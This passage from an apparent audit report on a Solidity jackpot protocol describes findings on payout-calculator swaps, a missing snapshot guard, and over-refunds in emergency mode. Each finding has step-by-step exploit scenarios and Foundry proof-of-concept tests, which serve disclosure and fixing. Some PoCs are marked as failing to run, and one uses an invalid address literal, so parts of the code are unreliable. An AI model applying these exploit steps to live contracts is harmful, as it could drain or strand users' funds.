            packed |= (uint256(1) << i);
        }
        uint8 bonus = 2; // normalMax + bonus = 256
        // Shift overflows 256-bit width; yields 0 on EVM
        uint256 withBonusDropped = packed | (uint256(1) << (uint256(normalMax) + uint256(bonus)));
        assertEq(withBonusDropped, packed, "bonus bit was not dropped as expected");

        // unpackTicket will revert by writing 5 normals into an array sized 4 (popCount-1)
        vm.expectRevert();
        unpackHarness.unpack(withBonusDropped, normalMax);
    }

    function test_TierUnderflow_WhenBothTicketAndWinningBonusBitsDropped() public {
        uint8 normalMax = 254;
        // Ticket normals {1,2,3,4,5}; no bonus bit set (dropped)
        uint256 ticket = 0;
        for (uint8 i = 1; i <= 5; ++i) {
            ticket |= (uint256(1) << i);
        }
        // Winning normals chosen disjointly {6,7,8,9,10} so matches == 0
        uint256 winning = 0;
        for (uint8 i = 6; i <= 10; ++i) {
            winning |= (uint256(1) << i);
        }
        // Simulate dropped winning bonus bit: shifting by >=256 would yield 0, so do not set any high bit
        // Thus, ticket >> (normalMax+1) == 0 and winning >> (normalMax+1) == 0 => bonusballMatch == 1

        vm.expectRevert();
        tierHarness.calcTier(ticket, winning, normalMax);
    }
}


## Suggested Mitigation
Enforce the packing boundary universally and add defensive checks:
- Drawing config bound: In Jackpot._setNewDrawingState, after computing newBonusball, require(uint256(normalBallMax) + uint256(newBonusball) <= 255) or clamp newBonusball to (255 - normalBallMax). Also enforce the same invariant in setNormalBallMax (validate against the current drawing’s stored bonusballMax) to prevent producing invalid combinations mid-life.
- Ticket packing guard: In TicketComboTracker.insert, before setting the bonus bit, require(uint256(_bonusball) + uint256(_tracker.normalMax) <= 255, "bonusball out of packing range");
- Optional hardening: In TicketComboTracker.unpackTicket, validate LibBit.popCount(_packedTicket) == (_normalMax + 1 > 0 ? 6 : 0) for this system (i.e., EXPECTED_NORMALS + 1) and revert with a clear error if not, to avoid silent corruption/array OOB writes.
- Alternative design (future): Store bonusball separately (e.g., in a dedicated byte or as a small uint8 alongside the normals bitset) to eliminate bit-shift boundary risks and simplify decoding.
- (Nice-to-have) Make _calculateTicketTierId resilient by guarding the subtraction: if (bonusballMatch == 1 && matches == 0) return 1; else return 2 * (matches - bonusballMatch) + bonusballMatch. This prevents accidental underflow should malformed packed tickets slip through; it does not replace the need for the configuration guards above.





 **Derived From** : Upgrading payoutCalculator breaks historical payouts (no per-drawing snapshot)

## [M-6]. Admin update to Jackpot.setPayoutCalculator invalidates historical tier payouts; past winners get 0 on claim

### Finding Severity Justification: Changing payoutCalculator after a drawing has been settled but before all winners claim causes past tickets to read tier payouts from the new calculator, which has no historical data. Winners can be paid 0 while their tickets are burned, creating real user fund loss. Exploitation requires an admin action (setPayoutCalculator), so under Code4rena guidelines (privileged vulnerabilities under reasonable use), severity is capped at Medium despite high impact.
## Derived From Pattern/Invariant
Upgrading payoutCalculator breaks historical payouts (no per-drawing snapshot)

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.setPayoutCalculator

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
Jackpot persists tier payouts inside the external payoutCalculator. At settlement, payouts are computed and stored in that external contract (GuaranteedMinimumPayoutCalculator.tierPayouts). Jackpot itself only stores the current payoutCalculator address. Later, claimWinnings() computes the ticket’s tier for a past drawing and calls payoutCalculator.getTierPayout(drawingId, tierId) — but this dereferences the live calculator, not the one used when the drawing was settled. If the owner calls setPayoutCalculator(newCalc) post-settlement (e.g., to upgrade logic), the newCalc will not contain the tierPayouts for past drawings, so claimWinnings will return 0 (or wrong) amounts while burning the NFT. This violates the invariant that finalized drawing payouts are immutable and claimable.

Vulnerable snippets:
- Jackpot.setPayoutCalculator: payoutCalculator = _payoutCalculator; (no migration/snapshot)
- Jackpot.claimWinnings: winningAmount = payoutCalculator.getTierPayout(drawingId, tierId);
- GuaranteedMinimumPayoutCalculator: tierPayouts[_drawingId][_tierId] stored in external calculator, not in Jackpot.

Consequence: Past winners can be underpaid (often 0), their tickets are burned, and funds remain in the pool, breaking payout accounting for settled drawings.

## Impact
If the owner updates payoutCalculator after a drawing is settled but before all winners have claimed, claimWinnings() will read tier payouts from the new calculator which does not hold the historical per-drawing tier data. Affected winners of past drawings will receive 0 (or incorrect) payouts and their tickets will be burned, permanently forfeiting winnings. Funds intended for those winners remain stranded in the Jackpot contract, breaking payout immutability and solvency accounting for settled drawings. Although the action is initiated by an admin, it is a realistic operational upgrade path and thus has high user-loss impact.

## Command to Run Test


## Proof of Concept
1) Drawing N is already settled and tier payouts were stored in payoutCalculator V1 at settlement.
2) Before all winners claim, the owner calls setPayoutCalculator(V2).
3) V2 has no historical tierPayouts for drawing N.
4) A winner from drawing N calls claimWinnings(). Jackpot computes the correct tier but calls payoutCalculator.getTierPayout(N, tier) on V2 and gets 0. The ticket is burned and the winner receives 0.
5) Winner’s funds remain stranded in the contract, violating the invariant that finalized drawing payouts are immutable and claimable.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Jackpot} from "contracts/Jackpot.sol";
import {IPayoutCalculator} from "contracts/interfaces/IPayoutCalculator.sol";
import {IJackpotTicketNFT} from "contracts/interfaces/IJackpotTicketNFT.sol";
import {IJackpotLPManager} from "contracts/interfaces/IJackpotLPManager.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockUSDC is ERC20 {
    constructor() ERC20("USDC", "USDC") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract MockLPManager is IJackpotLPManager {
    function processDeposit(uint256, address, uint256) external {}
    function processInitiateWithdraw(uint256, address, uint256) external {}
    function processFinalizeWithdraw(uint256, address) external pure returns (uint256) { return 0; }
    function processDrawingSettlement(uint256, uint256, uint256, uint256) external pure returns (uint256 newLPValue, uint256 newAccumulator) {
        return (0, 0);
    }
    function emergencyWithdrawLP(uint256, address) external pure returns (uint256) { return 0; }
    function initializeDrawingLP(uint256, uint256) external {}
    function setLPPoolCap(uint256, uint256) external {}
    function initializeLP() external {}
    function getDrawingAccumulator(uint256) external pure returns (uint256) { return 0; }
    function getLPDrawingState(uint256) external pure returns (LPDrawingState memory s) { return s; }
}

contract MockEntropy is IScaledEntropyProvider {
    function requestAndCallbackScaledRandomness(uint32, SetRequest[] memory, bytes4, bytes memory) external payable returns (uint64) { return 0; }
    function getFee(uint32) external pure returns (uint256) { return 0; }
}

contract MockNFT is IJackpotTicketNFT {
    address public immutable jackpot;
    mapping(uint256 => address) public ownerOf; // matches IERC721.ownerOf signature
    mapping(uint256 => TrackedTicket) public tickets;

    constructor(address _jackpot) { jackpot = _jackpot; }

    function mintTicket(address recipient, uint256 ticketId, uint256 drawingId, uint256 packedTicket, bytes32 referralScheme) external override {
        require(msg.sender == jackpot, "onlyJackpot");
        ownerOf[ticketId] = recipient;
        tickets[ticketId] = TrackedTicket({ drawingId: drawingId, packedTicket: packedTicket, referralScheme: referralScheme });
    }

    function burnTicket(uint256 ticketId) external override {
        require(msg.sender == jackpot, "onlyJackpot");
        delete ownerOf[ticketId];
        delete tickets[ticketId];
    }

    function getTicketInfo(uint256 ticketId) external view override returns (TrackedTicket memory) { return tickets[ticketId]; }
    function getUserTickets(address, uint256) external pure returns (ExtendedTrackedTicket[] memory) { return new ExtendedTrackedTicket[](0); }
}

contract PayoutCalcV1 is IPayoutCalculator {
    mapping(uint256 => mapping(uint256 => uint256)) public payout; // drawingId => tierId => amount
    function setP(uint256 d, uint256 t, uint256 a) external { payout[d][t] = a; }
    function calculateAndStoreDrawingUserWinnings(
        uint256, uint256, uint8, uint8, uint256[] memory, uint256[] memory
    ) external pure returns (uint256) { return 0; }
    function setDrawingTierInfo(uint256) external {}
    function getTierPayout(uint256 d, uint256 t) external view returns (uint256) { return payout[d][t]; }
}

contract PayoutCalcV2 is IPayoutCalculator {
    function calculateAndStoreDrawingUserWinnings(
        uint256, uint256, uint8, uint8, uint256[] memory, uint256[] memory
    ) external pure returns (uint256) { return 0; }
    function setDrawingTierInfo(uint256) external {}
    function getTierPayout(uint256, uint256) external pure returns (uint256) { return 0; }
}

contract JackpotHarness is Jackpot {
    constructor() Jackpot(
        1 days,
        10,    // normalBallMax
        1,     // bonusballMin
        1e16,  // lpEdgeTarget
        1e17,  // reserveRatio
        0,     // referralFee
        0,     // referralWinShare
        0,     // protocolFee
        0,     // protocolFeeThreshold
        1e6,   // ticketPrice (USDC 6dp)
        3,     // maxReferrers
        100000 // entropy base gas
    ) {}

    function harnessSetCurrentDrawingId(uint256 id) external { currentDrawingId = id; }
    function harnessSetDrawing(uint256 id, uint8 ballMax, uint256 winningTicket, uint256 referralWinShare_) external {
        drawingState[id].ballMax = ballMax;
        drawingState[id].winningTicket = winningTicket;
        drawingState[id].referralWinShare = referralWinShare_;
    }
}

contract PayoutCalculatorUpgradeBreaksClaimsTest is Test {
    JackpotHarness jack;
    MockUSDC usdc;
    MockLPManager lpm;
    MockNFT nft;
    MockEntropy entropy;
    PayoutCalcV1 calcV1;
    PayoutCalcV2 calcV2;

    address attacker = address(0xA11CE);

    function setUp() public {
        jack = new JackpotHarness();
        usdc = new MockUSDC();
        lpm = new MockLPManager();
        entropy = new MockEntropy();
        calcV1 = new PayoutCalcV1();
        calcV2 = new PayoutCalcV2();
        nft = new MockNFT(address(jack));

        jack.initialize(IERC20(address(usdc)), IJackpotLPManager(address(lpm)), IJackpotTicketNFT(address(nft)), IScaledEntropyProvider(address(entropy)), IPayoutCalculator(address(calcV1)));
    }

    function _pack(uint8 ballMax, uint8[] memory normals, uint8 bonus) internal pure returns (uint256 p) {
        for (uint i = 0; i < normals.length; i++) { p |= (uint256(1) << normals[i]); }
        p |= (uint256(1) << (bonus + ballMax));
    }

    function testUpgradePayoutCalculatorBreaksHistoricalClaims() public {
        // Prepare a settled drawing: drawingId=1, ballMax=10, winning ticket = [1,2,3,4,5]+bonus 1
        uint8 ballMax = 10;
        uint8[] memory normals = new uint8[](5); normals[0]=1; normals[1]=2; normals[2]=3; normals[3]=4; normals[4]=5;
        uint8 bonus = 1;
        uint256 packed = _pack(ballMax, normals, bonus);
        jack.harnessSetDrawing(1, ballMax, packed, 0); // referralWinShare = 0
        jack.harnessSetCurrentDrawingId(2); // drawing 1 is in the past

        // Mint two identical winning tickets for drawing 1 to attacker
        uint256 t1 = 111;
        uint256 t2 = 222;
        vm.prank(address(jack));
        nft.mintTicket(attacker, t1, 1, packed, bytes32(0));
        vm.prank(address(jack));
        nft.mintTicket(attacker, t2, 1, packed, bytes32(0));

        // Tier for perfect match = 11
        calcV1.setP(1, 11, 100e6);

        // Fund Jackpot with USDC for payouts
        usdc.mint(address(jack), 100e6);

        // Claim first ticket BEFORE upgrade -> gets 100 USDC
        vm.startPrank(attacker);
        uint256 balBefore = usdc.balanceOf(attacker);
        uint256[] memory arr1 = new uint256[](1); arr1[0] = t1;
        jack.claimWinnings(arr1);
        uint256 balAfter = usdc.balanceOf(attacker);
        vm.stopPrank();
        assertEq(balAfter - balBefore, 100e6, "expected 100 USDC before upgrade");

        // Owner upgrades payoutCalculator to a fresh instance with no historical data
        jack.setPayoutCalculator(IPayoutCalculator(address(calcV2)));

        // Claim second ticket AFTER upgrade -> gets 0 due to missing historical payouts
        vm.startPrank(attacker);
        uint256 bal2Before = usdc.balanceOf(attacker);
        uint256[] memory arr2 = new uint256[](1); arr2[0] = t2;
        jack.claimWinnings(arr2);
        uint256 bal2After = usdc.balanceOf(attacker);
        vm.stopPrank();
        assertEq(bal2After - bal2Before, 0, "payout should be 0 after upgrade - broken invariants");
    }
}


## Suggested Mitigation
Snapshot the payout calculator used for each drawing and query that snapshot during claims, or internalize tier payouts into Jackpot at settlement:

Option A (snapshot calculator address):
- Add `mapping(uint256 => IPayoutCalculator) payoutCalculatorByDrawing;`
- In scaledEntropyCallback, immediately before or after calling `calculateAndStoreDrawingUserWinnings(currentDrawingId, ...)`, set `payoutCalculatorByDrawing[currentDrawingId] = payoutCalculator;`
- In `claimWinnings`, replace `payoutCalculator.getTierPayout(drawingId, tierId)` with `payoutCalculatorByDrawing[drawingId].getTierPayout(drawingId, tierId)`.
- On upgrading calculators, the new one is used only for future drawings; historical drawings continue to reference the snapshot.
- Provide an admin-only migration helper to retroactively set `payoutCalculatorByDrawing[d]` for past drawings if the feature is introduced after deployment.

Option B (store payouts in Jackpot):
- Modify the calculator interface to return the computed 12-tier payouts for a drawing, and persist them in `Jackpot` storage (e.g., `mapping(uint256 => uint256[12]) drawingTierPayouts`).
- `claimWinnings` then reads from Jackpot’s immutable snapshot for that drawing, making changes to external calculators harmless.

Additionally, document operational guidance: do not call `setPayoutCalculator` until all drawings that rely on the current calculator have been snapshotted (via A/B above). This fully eliminates the bug and preserves historical payout immutability.





 **Derived From** : Per-drawing config not enforced: missing snapshot guard lets payouts use zeroed defaults

## [M-7]. Missing snapshot guard in GuaranteedMinimumPayoutCalculator.calculateAndStoreDrawingUserWinnings lets mid-drawing calculator swap zero out all payouts

### Finding Severity Justification: Replacing the payoutCalculator mid-drawing causes the new calculator to lack the per-drawing snapshot, leading calculateAndStoreDrawingUserWinnings to operate on default-zero configuration and return/stores zero payouts for all tiers. This can zero out legitimate user winnings for that drawing. Impact is high (users lose payouts), but it requires a privileged owner action; per Code4rena, privileged-function bugs under reasonable use are capped at Medium.
## Derived From Pattern/Invariant
Per-drawing config not enforced: missing snapshot guard lets payouts use zeroed defaults

## Exploit Type
UpgradeabilityInitializerSafety

## Location
GuaranteedMinimumPayoutCalculator.calculateAndStoreDrawingUserWinnings

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
calculateAndStoreDrawingUserWinnings reads DrawingTierInfo from drawingTierInfo[_drawingId] without verifying a snapshot was set. If setDrawingTierInfo(_drawingId) wasn't called in this calculator instance, tierInfo fields default to zeros and falses, causing the loop to skip every tier and set no payouts. Vulnerable snippets: (1) DrawingTierInfo storage tierInfo = drawingTierInfo[_drawingId]; (2) if (!tierInfo.minPayoutTiers[i] && tierInfo.premiumTierWeights[i] == 0) { tierWinners[i] = 0; continue; }. In practice, if the owner replaces payoutCalculator mid‑drawing, the new calculator has no per‑drawing snapshot for the current drawing. When Jackpot later settles and calls calculateAndStoreDrawingUserWinnings, it operates on zeroed defaults, computes tierWinners=0 across all tiers, stores no tier payouts, and returns totalPayout=0 even with real winners. This bricks prize distribution for that drawing and violates the invariant that admin changes apply only to future drawings.

## Impact
If the owner replaces payoutCalculator after a drawing has been initialized (i.e., after _setNewDrawingState ran and snapshotted config into the old calculator), the new calculator lacks drawingTierInfo for the active drawing. calculateAndStoreDrawingUserWinnings then operates on default-zero configuration, stores zero per-tier payouts, and returns totalPayout=0. Winners for that drawing can never receive payouts (getTierPayout returns 0), and the entire prize pool remains with LP accounting. This is a privileged-action bug (owner-induced), so severity is Medium per Code4rena guidelines.

## Command to Run Test


## Proof of Concept
Steps to reproduce:
1) Initialize a drawing normally so that Jackpot calls oldCalculator.setDrawingTierInfo(currentDrawingId) during new drawing setup.
2) Before settlement, owner calls Jackpot.setPayoutCalculator(newCalculator) to swap in a fresh calculator that has not snapshotted currentDrawingId.
3) Keeper runs the drawing; Jackpot later calls newCalculator.calculateAndStoreDrawingUserWinnings(currentDrawingId, ...).
4) In newCalculator, drawingTierInfo[currentDrawingId] is unset (struct defaults): minPayout=0; premiumTierMinAllocation=0; minPayoutTiers=false[12]; premiumTierWeights=0[12].
5) The calculation loop treats every tier as ineligible and sets tierWinners[i]=0, skipping payout storage entirely. The function returns totalPayout=0.
6) All users for that drawing will later see getTierPayout(currentDrawingId, tierId)==0 and receive 0 on claim, despite legitimate wins. Funds remain in the LP pool.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {GuaranteedMinimumPayoutCalculator} from "contracts/GuaranteedMinimumPayoutCalculator.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";

contract PayoutCalculatorSwapTest is Test {
    uint256 constant PRECISE_UNIT = 1e18;

    // Treat this test contract as the Jackpot for onlyJackpot gating
    // Simulates: snapshot taken on old calculator; mid-drawing swap to new calculator; new calculator returns zero.
    function test_MidDrawingSwap_ZeroesPayouts() public {
        // Config: only jackpot tier (tier 11) has weight
        bool[12] memory minTiers;
        minTiers[11] = true;
        uint256[12] memory weights;
        weights[11] = PRECISE_UNIT;

        // Deploy OLD calculator and snapshot current drawing there
        GuaranteedMinimumPayoutCalculator oldCalc = new GuaranteedMinimumPayoutCalculator(
            IJackpot(address(this)),
            0,                  // minimumPayout
            0,                  // premiumTierMinAllocation
            minTiers,
            weights
        );

        uint256 drawingId = 1;
        oldCalc.setDrawingTierInfo(drawingId); // Snapshot taken on OLD calculator

        // Owner swaps to NEW calculator mid-drawing (no snapshot exists there)
        GuaranteedMinimumPayoutCalculator newCalc = new GuaranteedMinimumPayoutCalculator(
            IJackpot(address(this)),
            0,
            0,
            minTiers,
            weights
        );

        uint256 prizePool = 1_000_000_000; // 1000 USDC (6 decimals)
        uint8 normalMax = 9;   // >= 5
        uint8 bonusMax = 2;    // small but > 0

        uint256[] memory uniqueRes = new uint256[](12);
        uint256[] memory dupRes = new uint256[](12);
        uniqueRes[11] = 1; // one jackpot winner

        // NEW calculator has no snapshot for drawingId => should return 0 and store no payouts
        uint256 payoutZero = newCalc.calculateAndStoreDrawingUserWinnings(
            drawingId, prizePool, normalMax, bonusMax, uniqueRes, dupRes
        );
        assertEq(payoutZero, 0, "New calc without snapshot must return 0 payout");
        assertEq(newCalc.getTierPayout(drawingId, 11), 0, "Tier payout must be 0 when snapshot missing");

        // Control: OLD calculator (with snapshot) produces non-zero payout
        uint256 payoutOld = oldCalc.calculateAndStoreDrawingUserWinnings(
            drawingId, prizePool, normalMax, bonusMax, uniqueRes, dupRes
        );
        assertGt(payoutOld, 0, "Old calc with snapshot must compute > 0 payout");
        assertGt(oldCalc.getTierPayout(drawingId, 11), 0, "Tier payout should be > 0 with snapshot");
    }
}


## Suggested Mitigation
Protocol-level fixes (recommend implementing both):
1) Calculator-side guard: Track an initialization flag per drawing. Add a boolean snapshotSet to DrawingTierInfo (or a parallel mapping). Set it to true in setDrawingTierInfo, and at the start of calculateAndStoreDrawingUserWinnings require(snapshotSet). As a lighter-weight alternative, validate sum(premiumTierWeights) == PRECISE_UNIT for the struct and revert if not set for this drawing.

2) Jackpot-side safe upgrade: Make setPayoutCalculator two-step and future-effective:
   - Store a pendingPayoutCalculator, but keep using the current payoutCalculator until the next drawing is created.
   - On _setNewDrawingState, if pendingPayoutCalculator != address(0), replace payoutCalculator with pendingPayoutCalculator and immediately call payoutCalculator.setDrawingTierInfo(currentDrawingId) for the new drawing; then clear pendingPayoutCalculator.
   - Optionally, disallow direct swaps during an active drawing (require no pending drawing settlement), or revert if the current drawing has already been snapshotted in the old calculator.

These changes ensure the active drawing always has a valid snapshot in the calculator used for settlement and prevent zeroed payouts due to mid-drawing swaps.





 **Derived From** : Emergency refunds use current referralFee instead of per-drawing fee, causing over/under-refunds

## [M-8]. Retroactive fee use in Jackpot.emergencyRefundTickets misprices refunds and can overpay beyond ticket revenue

### Finding Severity Justification: Emergency refunds for referred tickets use the current global referralFee instead of the fee in effect at purchase. This can over-refund (if fee was lowered) or under-refund (if fee was raised) compared to ticket revenue and previously accrued referral balances, misallocating real funds. Impact is bounded to emergency mode and requires a mid-drawing param change, so not catastrophic but materially affects solvency/accounting.
## Derived From Pattern/Invariant
Emergency refunds use current referralFee instead of per-drawing fee, causing over/under-refunds

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.emergencyRefundTickets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In Jackpot.emergencyRefundTickets(), the refund for tickets that used a referral scheme is computed with the current global referralFee, not the fee in effect at purchase. Vulnerable snippet:

uint256 refundAmount = ticketInfo.referralScheme == bytes32(0)
    ? drawingState[ticketInfo.drawingId].ticketPrice
    : drawingState[ticketInfo.drawingId].ticketPrice * (PRECISE_UNIT - referralFee) / PRECISE_UNIT;

Because referralFee is global and not snapshotted per drawing (unlike referralWinShare), mid-drawing governance updates retroactively change emergency refund amounts. If referralFee is reduced before emergency mode, referred users can receive a full (100%) refund while referrers still keep the previously accrued referral fees at the higher, pre-change rate. This can lead to >100% outflow per ticket (e.g., 120% when fee drops from 20% to 0%), breaking accounting invariants and draining LP/contract funds during emergency. Conversely, if referralFee increases before emergency, users are under-refunded, shifting value away from users and breaking per-drawing refund invariants.

## Impact
Over-refund drains funds (refund + legacy referral fees > ticket revenue) or under-refund shortchanges users; violates invariant that admin parameter changes should not retroactively affect prior purchases, risking solvency skew in emergency.

## Command to Run Test


## Proof of Concept
Scenario (permissionless user):
1) referralFee initially 20%. Attacker buys a referred ticket of price 1 USDC; referrer accrues 0.2 USDC in referralFees.
2) Governance (legitimate action) reduces referralFee to 0% mid-drawing (intended for future purchases).
3) Owner enables emergency mode due to outage; attacker calls emergencyRefundTickets.
4) Refund uses the now-0% referralFee, returning 1.0 USDC instead of the intended 0.8 USDC (based on purchase-time fee).
5) Referrer calls claimReferralFees and receives the previously accrued 0.2 USDC.
Result: Contract pays 1.2 USDC against 1.0 USDC of ticket revenue (20% overpayment), draining funds and breaking accounting invariants.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Jackpot} from "contracts/Jackpot.sol";
import {JackpotTicketNFT} from "contracts/JackpotTicketNFT.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IPayoutCalculator} from "contracts/interfaces/IPayoutCalculator.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
import {IJackpotLPManager} from "contracts/interfaces/IJackpotLPManager.sol";

contract MockUSDC {
    string public name = "MockUSDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function approve(address sp, uint256 amt) external returns (bool) { allowance[msg.sender][sp] = amt; return true; }
    function transfer(address to, uint256 amt) external returns (bool) { require(balanceOf[msg.sender] >= amt, "bal"); balanceOf[msg.sender] -= amt; balanceOf[to] += amt; return true; }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) { require(balanceOf[from] >= amt, "bal"); uint256 a = allowance[from][msg.sender]; require(a >= amt, "allow"); if (a != type(uint256).max) allowance[from][msg.sender] = a - amt; balanceOf[from] -= amt; balanceOf[to] += amt; return true; }
}

contract MockLPManager is IJackpotLPManager {
    mapping(uint256 => LPDrawingState) internal st;
    mapping(uint256 => uint256) public drawingAccumulator;
    uint256 public lpPoolCap;
    function processDeposit(uint256 _drawingId, address, uint256 _amount) external { st[_drawingId].pendingDeposits += _amount; }
    function processInitiateWithdraw(uint256, address, uint256) external {}
    function processFinalizeWithdraw(uint256, address) external pure returns (uint256) { return 0; }
    function processDrawingSettlement(uint256 _drawingId, uint256, uint256, uint256) external returns (uint256 newLPValue, uint256 newAccumulator) {
        newLPValue = st[_drawingId].lpPoolTotal + st[_drawingId].pendingDeposits;
        st[_drawingId].pendingDeposits = 0;
        newAccumulator = 1e18;
        drawingAccumulator[_drawingId] = newAccumulator;
    }
    function emergencyWithdrawLP(uint256, address) external pure returns (uint256) { return 0; }
    function initializeDrawingLP(uint256 _drawingId, uint256 _initialLPValue) external { st[_drawingId] = LPDrawingState({lpPoolTotal:_initialLPValue,pendingDeposits:0,pendingWithdrawals:0}); }
    function setLPPoolCap(uint256, uint256 _lpPoolCap) external { lpPoolCap = _lpPoolCap; }
    function initializeLP() external { drawingAccumulator[0] = 1e18; }
    function getDrawingAccumulator(uint256 _drawingId) external view returns (uint256) { return drawingAccumulator[_drawingId]; }
    function getLPDrawingState(uint256 _drawingId) external view returns (LPDrawingState memory) { return st[_drawingId]; }
    // test helper
    function _setPendingDeposits(uint256 _drawingId, uint256 amt) external { st[_drawingId].pendingDeposits = amt; }
}

contract MockPayoutCalc is IPayoutCalculator {
    function calculateAndStoreDrawingUserWinnings(uint256, uint256, uint8, uint8, uint256[] memory, uint256[] memory) external pure returns (uint256) { return 0; }
    function setDrawingTierInfo(uint256) external {}
    function getTierPayout(uint256, uint256) external pure returns (uint256) { return 0; }
}

contract DummyEntropy is IScaledEntropyProvider {
    function requestAndCallbackScaledRandomness(uint32, SetRequest[] memory, bytes4, bytes memory) external payable returns (uint64) { return 0; }
    function getFee(uint32) external pure returns (uint256) { return 0; }
}

contract RefundFeeSnapshotTest is Test {
    uint256 constant PRECISE_UNIT = 1e18;
    Jackpot jp;
    JackpotTicketNFT nft;
    MockUSDC usdc;
    MockLPManager lpm;
    MockPayoutCalc pc;
    DummyEntropy de;

    address attacker = address(0xA11CE);
    address referrer = address(0xB0B);
    address lp = address(0x1LP);

    function setUp() public {
        usdc = new MockUSDC();
        lpm = new MockLPManager();
        pc = new MockPayoutCalc();
        de = new DummyEntropy();
        // Jackpot constructor
        jp = new Jackpot(
            1 days,      // drawingDuration
            10,          // normalBallMax
            1,           // bonusballMin
            1e17,        // lpEdgeTarget 10%
            0,           // reserveRatio
            2e17,        // referralFee 20%
            0,           // referralWinShare
            0,           // protocolFee
            0,           // protocolFeeThreshold
            1_000_000,   // ticketPrice = 1 USDC (6 decimals)
            5,           // maxReferrers
            400000       // entropyBaseGasLimit
        );
        nft = new JackpotTicketNFT(IJackpot(address(jp)));

        // wire dependencies
        jp.initialize(IERC20(address(usdc)), IJackpotLPManager(address(lpm)), IJackpotTicketNFT(address(nft)), IScaledEntropyProvider(address(de)), IPayoutCalculator(address(pc)));

        // init LP system & first drawing
        jp.initializeLPDeposits(type(uint256).max / 2);
        lpm._setPendingDeposits(0, 10_000_000); // seed some LP value
        jp.initializeJackpot(block.timestamp + 1);

        // fund LP so contract can pay refunds and fees
        usdc.mint(lp, 20_000_000);
        vm.startPrank(lp);
        usdc.approve(address(jp), type(uint256).max);
        jp.lpDeposit(10_000_000);
        vm.stopPrank();

        // fund attacker to buy a ticket
        usdc.mint(attacker, 1_000_000);
    }

    function test_OverRefundWhenReferralFeeLowered_midDrawing() public {
        // attacker buys 1 referred ticket at referralFee = 20%
        vm.startPrank(attacker);
        usdc.approve(address(jp), type(uint256).max);
        IJackpot.Ticket[] memory t = new IJackpot.Ticket[](1);
        uint8[] memory normals = new uint8[](5);
        normals[0]=1; normals[1]=2; normals[2]=3; normals[3]=4; normals[4]=5;
        t[0] = IJackpot.Ticket({normals: normals, bonusball: 1});
        address[] memory refs = new address[](1); refs[0] = referrer;
        uint256[] memory splits = new uint256[](1); splits[0] = PRECISE_UNIT;
        uint256[] memory ids = jp.buyTickets(t, attacker, refs, splits, bytes32(0));
        vm.stopPrank();

        // Record contract balance pre-refund/fees
        uint256 preBal = usdc.balanceOf(address(jp));

        // Governance lowers referralFee to 0% mid-drawing (intended for future), then emergency
        jp.setReferralFee(0);
        jp.enableEmergencyMode();

        // Attacker refunds: uses current referralFee (0%), so gets full 1.0 USDC
        vm.prank(attacker);
        uint256[] memory toRefund = new uint256[](1); toRefund[0] = ids[0];
        jp.emergencyRefundTickets(toRefund);

        // Referrer claims legacy referral fees from purchase-time 20%
        vm.prank(referrer);
        jp.claimReferralFees();

        // Check attacker got 1.0 USDC back (had 0 after buy)
        assertEq(usdc.balanceOf(attacker), 1_000_000);

        // Contract should have paid 1.2 USDC total (1.0 refund + 0.2 referral fees)
        uint256 postBal = usdc.balanceOf(address(jp));
        assertEq(preBal - postBal, 1_200_000);
    }
}


## Suggested Mitigation
Use the referral fee that applied at purchase time when computing emergency refunds. Two robust options:
- Store per-ticket snapshot: add a field (e.g., referralFeeAtPurchase) to the ticket metadata in JackpotTicketNFT.mintTicket and set it from the current referralFee during buyTickets(). In emergencyRefundTickets(), compute refund as ticketPrice * (PRECISE_UNIT - referralFeeAtPurchase) / PRECISE_UNIT for tickets with a referral scheme.
- Alternatively, enforce that referralFee cannot change mid-drawing and snapshot it per drawing: add referralFeeAtInit to DrawingState and set it when initializing a drawing; use that snapshotted value both when crediting referrers for purchases and when refunding. If governance must be able to change referralFee intra-drawing, prefer the per-ticket snapshot approach to preserve correctness for all tickets.





 **Derived From** : Ticket-claim signatures lack nonce/deadline → replayable outdated transfers

## [L-9]. Replay of old EIP-712 ticket-claim signatures lets anyone front-run and transfer tickets to an outdated recipient

### Finding Severity Justification: claimTickets uses EIP-712 signatures without a nonce, deadline, or used-signature tracking. This allows any previously signed authorization for the same tickets (with a different recipient) to be executed once, enabling a front-run to deliver tickets to an older, still-authorized recipient. However, the signature binds the recipient and cannot be altered by an attacker, and once executed, further replays fail due to ownership mapping being cleared. Impact is limited to executing a prior user-approved transfer (mismatching current intent), not arbitrary theft.
## Derived From Pattern/Invariant
Ticket-claim signatures lack nonce/deadline → replayable outdated transfers

## Exploit Type
ReplayAttack

## Location
JackpotBridgeManager.claimTickets

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
